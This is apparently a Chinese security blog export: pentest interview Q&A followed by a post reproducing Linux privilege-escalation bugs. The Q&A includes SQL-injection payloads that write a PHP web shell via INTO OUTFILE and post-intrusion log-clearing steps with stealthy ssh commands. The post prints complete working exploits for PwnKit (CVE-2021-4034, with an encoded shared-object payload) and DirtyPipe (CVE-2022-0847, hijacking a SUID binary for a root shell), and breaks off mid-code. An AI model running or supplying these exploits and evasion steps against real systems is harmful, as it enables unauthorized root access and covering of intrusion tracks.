<h3 id="为什么参数化查询可以防止-sql-注入"><a href="#为什么参数化查询可以防止-sql-注入" class="headerlink" title="为什么参数化查询可以防止 sql 注入"></a>为什么参数化查询可以防止 sql 注入</h3><p>  参数化查询可以对参数进行过滤，还能够重用执行计划，若执行计划被重用的话，SQL所要表达的语义是不会变化的<br>  之前学javaweb时候用过预处理的方法 把变量用?代替 然后再去写那个函数</p>
<h3 id="sql-如何写-shell-单引号被过滤怎么办"><a href="#sql-如何写-shell-单引号被过滤怎么办" class="headerlink" title="sql 如何写 shell/单引号被过滤怎么办"></a>sql 如何写 shell/单引号被过滤怎么办</h3><p>  &lt;1&gt; 写shell(root权限，GPC关闭，知道文件路径，outfile函数)<br>  <code>http://127.0.0.1:81/sqli.php?id=1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&#39;</code><br>  <code>http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;</code><br>  &lt;2&gt; 宽字节注入</p>
<h3 id="对于-XSS-怎么修补建议"><a href="#对于-XSS-怎么修补建议" class="headerlink" title="对于 XSS 怎么修补建议"></a>对于 XSS 怎么修补建议</h3><p>  输入编码转义(可以用html实体编码)<br>  白名单过滤(过滤一些标签和js事件)<br>  httponly</p>
<h3 id="添加-token和-referer-做横向对比，谁安全等级高？"><a href="#添加-token和-referer-做横向对比，谁安全等级高？" class="headerlink" title="添加 token和 referer 做横向对比，谁安全等级高？"></a>添加 token和 referer 做横向对比，谁安全等级高？</h3><p>  token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。<br>  并且FLASH一些版本中可以自定义referer。<br>  但是token的话，要保证其足够随机且不可泄露</p>
<h3 id="常见的上传绕过方式"><a href="#常见的上传绕过方式" class="headerlink" title="常见的上传绕过方式"></a>常见的上传绕过方式</h3><p>  前端js验证 bp抓包改包<br>  大小写、双写<br>  00截断 %00 0x00<br>  mime类型绕过 改Content-Type</p>
<h3 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title="导致文件包含的函数"></a>导致文件包含的函数</h3><p>  <code>PHP: include(), include_once(), require(),require_once</code><br>  可参考 <a href="https://err0rzz.github.io/2017/08/31/file_include/">https://err0rzz.github.io/2017/08/31/file_include/</a></p>
<h3 id="入侵-Linux-服务器后需要清除哪些日志？"><a href="#入侵-Linux-服务器后需要清除哪些日志？" class="headerlink" title="入侵 Linux 服务器后需要清除哪些日志？"></a>入侵 Linux 服务器后需要清除哪些日志？</h3><p>  history   vim ~/.bash_history<br>  系统日志<br>  web日志   删除指定ip 时间点<br>  ssh登录记录 隐身登录系统，不会被w、who、last等指令检测到(<code>ssh -T root@192.168.0.1 /bin/bash -i</code>)<br>              不记录ssh公钥在本地.ssh目录中(<code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code>)</p>
<h3 id="如何加固一个域环境下的-Windows-桌面工作环境？请给出你的思路。"><a href="#如何加固一个域环境下的-Windows-桌面工作环境？请给出你的思路。" class="headerlink" title="如何加固一个域环境下的 Windows 桌面工作环境？请给出你的思路。"></a>如何加固一个域环境下的 Windows 桌面工作环境？请给出你的思路。</h3><p>  &lt;1&gt; 修补补丁，及时备份<br>  &lt;2&gt; 排查弱口令和账号<br>  &lt;3&gt; 开启服务与端口配置 关闭不必要的端口和服务<br>  &lt;4&gt; 日志配置与审核  增加日志大小以保证完整 对系统事件审核<br>  &lt;5&gt; 系统安全设置  设置屏保和远程连接挂起时间，禁止系统自动登录<br>  &lt;6&gt; 授权  只允许管理员组用户远程开机关机 只有授权用户才可远程登录或本地登录<br>  &lt;7&gt; 文件系统权限 删除everyone权限或取消everyone的写权限 限制部分系统命令的访问权限</p>
<h3 id="宝塔禁止PHP函数如何绕过？"><a href="#宝塔禁止PHP函数如何绕过？" class="headerlink" title="宝塔禁止PHP函数如何绕过？"></a>宝塔禁止PHP函数如何绕过？</h3><p>  蚁剑disable_function插件</p>
<h3 id="fastjson不出网如何利用？"><a href="#fastjson不出网如何利用？" class="headerlink" title="fastjson不出网如何利用？"></a>fastjson不出网如何利用？</h3><p>  dnslog回显</p>
<h3 id="域内的一个普通用户（非域用户）如何进行利用？"><a href="#域内的一个普通用户（非域用户）如何进行利用？" class="headerlink" title="域内的一个普通用户（非域用户）如何进行利用？"></a>域内的一个普通用户（非域用户）如何进行利用？</h3><p>  域内提权？？CVE 2021-42287 / CVE 2021-42278</p>
<h3 id="go语言免杀shellcode如何免杀？免杀原理是什么？"><a href="#go语言免杀shellcode如何免杀？免杀原理是什么？" class="headerlink" title="go语言免杀shellcode如何免杀？免杀原理是什么？"></a>go语言免杀shellcode如何免杀？免杀原理是什么？</h3><h3 id="windows-defender防御机制原理，如何绕过？"><a href="#windows-defender防御机制原理，如何绕过？" class="headerlink" title="windows defender防御机制原理，如何绕过？"></a>windows defender防御机制原理，如何绕过？</h3><h3 id="卡巴斯基进程保护如何绕过进行进程迁移？"><a href="#卡巴斯基进程保护如何绕过进行进程迁移？" class="headerlink" title="卡巴斯基进程保护如何绕过进行进程迁移？"></a>卡巴斯基进程保护如何绕过进行进程迁移？</h3><h3 id="工作组环境下如何进行渗透？"><a href="#工作组环境下如何进行渗透？" class="headerlink" title="工作组环境下如何进行渗透？"></a>工作组环境下如何进行渗透？</h3><h3 id="内存马的机制？"><a href="#内存马的机制？" class="headerlink" title="内存马的机制？"></a>内存马的机制？</h3><h3 id="说出印象比较深刻的一次外网打点进入内网？"><a href="#说出印象比较深刻的一次外网打点进入内网？" class="headerlink" title="说出印象比较深刻的一次外网打点进入内网？"></a>说出印象比较深刻的一次外网打点进入内网？</h3><h3 id="证书透明度的危害？"><a href="#证书透明度的危害？" class="headerlink" title="证书透明度的危害？"></a>证书透明度的危害？</h3>]]></content>
  </entry>
  <entry>
    <title>Linux提权漏洞复现</title>
    <url>/posts/1a565dd/</url>
    <content><![CDATA[<h2 id="Polkit权限提升漏洞-CVE-2021-4034"><a href="#Polkit权限提升漏洞-CVE-2021-4034" class="headerlink" title="Polkit权限提升漏洞 CVE-2021-4034"></a>Polkit权限提升漏洞 CVE-2021-4034</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Qualys 研究团队在 polkit 的 pkexec 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>Polkit &gt; 2009</li>
</ul>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote>
<p>POC来源: <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</a></p>
</blockquote>
<br>

<p><img src="/posts/1a565dd/1.png" alt="截图"></p>
<br>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><blockquote>
<p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys</span></span><br><span class="line"><span class="comment"># hardcoded amd64 lib</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">payload = zlib.decompress(</span><br><span class="line">    base64.b64decode(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;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&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">libc = CDLL(find_library(<span class="string">&quot;c&quot;</span>))</span><br><span class="line">libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)</span><br><span class="line">libc.execve.restype = c_ssize_t</span><br><span class="line"></span><br><span class="line">wd = tempfile.mkdtemp()</span><br><span class="line"><span class="built_in">open</span>(wd + <span class="string">&quot;/pwn.so&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(payload)</span><br><span class="line">os.mkdir(wd + <span class="string">&quot;/gconv/&quot;</span>)</span><br><span class="line"><span class="built_in">open</span>(wd + <span class="string">&quot;/gconv/gconv-modules&quot;</span>, <span class="string">&quot;w&quot;</span>).write(</span><br><span class="line">    <span class="string">&quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;</span></span><br><span class="line">)</span><br><span class="line">os.mkdir(wd + <span class="string">&quot;/GCONV_PATH=.&quot;</span>)</span><br><span class="line">os.mknod(wd + <span class="string">&quot;/GCONV_PATH=./gconv&quot;</span>)</span><br><span class="line">os.chmod(wd + <span class="string">&quot;/GCONV_PATH=.&quot;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.chmod(wd + <span class="string">&quot;/GCONV_PATH=./gconv&quot;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.chmod(wd + <span class="string">&quot;/pwn.so&quot;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.chdir(wd)</span><br><span class="line">cmd = <span class="string">b&quot;/usr/bin/pkexec&quot;</span></span><br><span class="line">argv = []</span><br><span class="line">envp = [</span><br><span class="line">    <span class="string">b&quot;gconv&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;XAUTHORITY=../gconv&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cargv = (c_char_p * (<span class="built_in">len</span>(argv) + <span class="number">1</span>))(*argv, <span class="literal">None</span>)</span><br><span class="line">cenv = (c_char_p * (<span class="built_in">len</span>(envp) + <span class="number">1</span>))(*envp, <span class="literal">None</span>)</span><br><span class="line">libc.execve(cmd, cargv, cenv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="DirtyPipe本地提权-CVE-2022-0847"><a href="#DirtyPipe本地提权-CVE-2022-0847" class="headerlink" title="DirtyPipe本地提权 CVE-2022-0847"></a>DirtyPipe本地提权 CVE-2022-0847</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。 CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”</p>
<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul>
<li>Linux内核 5.8 及之后版本</li>
</ul>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>查找具有suid权限的可执行文件</p>
<p><code>find / -user root -perm /4000 2&gt;/dev/null</code></p>
<p><img src="/posts/1a565dd/2.png" alt="截图"></p>
<br>

<p>需要在目标机器上使用gcc进行编译</p>
<p><img src="/posts/1a565dd/3.png" alt="截图"></p>
<br>

<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// dirtypipez.c</span><br><span class="line">//</span><br><span class="line">// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn</span><br><span class="line">// a root shell. (and attempts to restore the damaged binary as well)</span><br><span class="line">//</span><br><span class="line">// Wow, Dirty CoW reloaded!</span><br><span class="line">//</span><br><span class="line">// -- blasty &lt;peter@haxx.in&gt; // 2022-03-07</span><br><span class="line"></span><br><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">// small (linux x86_64) ELF file matroshka doll that does;</span><br><span class="line">//   fd = open(&quot;/tmp/sh&quot;, O_WRONLY | O_CREAT | O_TRUNC);</span><br><span class="line">//   write(fd, elfcode, elfcode_len)</span><br><span class="line">//   chmod(&quot;/tmp/sh&quot;, 04755)</span><br><span class="line">//   close(fd);</span><br><span class="line">//   exit(0);</span><br><span class="line">//</span><br><span class="line">// the dropped ELF simply does:</span><br><span class="line">//   setuid(0);</span><br><span class="line">//   setgid(0);</span><br><span class="line">//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);</span><br><span class="line">unsigned char elfcode[] = &#123;</span><br><span class="line">	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,</span><br><span class="line">	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,</span><br><span class="line">	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,</span><br><span class="line">	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,</span><br><span class="line">	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,</span><br><span class="line">	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,</span><br><span class="line">	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,</span><br><span class="line">	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,</span><br><span class="line">	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,</span><br><span class="line">	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">	if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">	static char buffer[4096];</span><br><span class="line"></span><br><span class="line">	/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		write(p[1], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">	   leaving the flags initialized) */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		read(p[0], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the pipe is now empty, and if somebody adds a new</span><br><span class="line">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">	   will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int hax(char *filename, long offset, uint8_t *data, size_t len) &#123;</span><br><span class="line">	/* open the input file and validate the specified offset */</span><br><span class="line">	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">	if (fd &lt; 0) &#123;</span><br><span class="line">		perror(&quot;open failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	struct stat st;</span><br><span class="line">	if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(&quot;stat failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* create the pipe with all flags initialized with</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">	int p[2];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	/* splice one byte from before the specified offset into the</span><br><span class="line">	   pipe; this will add a reference to the page cache, but</span><br><span class="line">	   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">	--offset;</span><br><span class="line">	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;splice failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if (nbytes == 0) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the following write will not create a new pipe_buffer, but</span><br><span class="line">	   will instead write into the page cache, because of the</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	nbytes = write(p[1], data, len);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;write failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if ((size_t)nbytes &lt; len) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	if (argc != 2) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Usage: %s SUID\n&quot;, argv[0]);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char *path = argv[1];</span><br><span class="line">	uint8_t *data = elfcode;</span><br><span class="line"></span><br><span class="line">	int fd = open(path, O_RDONLY);</span><br><span class="line">	uint8_t *orig_bytes = malloc(sizeof(elfcode));</span><br><span class="line">	lseek(fd, 1, SEEK_SET);</span><br><span class="line">	read(fd, orig_bytes, sizeof(elfcode));</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] hijacking suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] 